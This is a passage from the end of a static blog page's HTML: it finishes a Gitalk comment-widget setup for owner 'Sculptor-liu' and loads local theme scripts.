    owner: 'Sculptor-liu',
    admin: ['Sculptor-liu'],
    distractionFreeMode: 'false',
    language: 'zh-CN'
  });
  gitalk.render('gitalk-container');
}

if (false) {
  loadGitalk();
} else {
  window.addEventListener('DOMContentLoaded', loadGitalk, false);
}</script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script src="/js/sidebar.js?v=2.1.1"></script><script type="application/json" src="/search.xml"></script></body></html>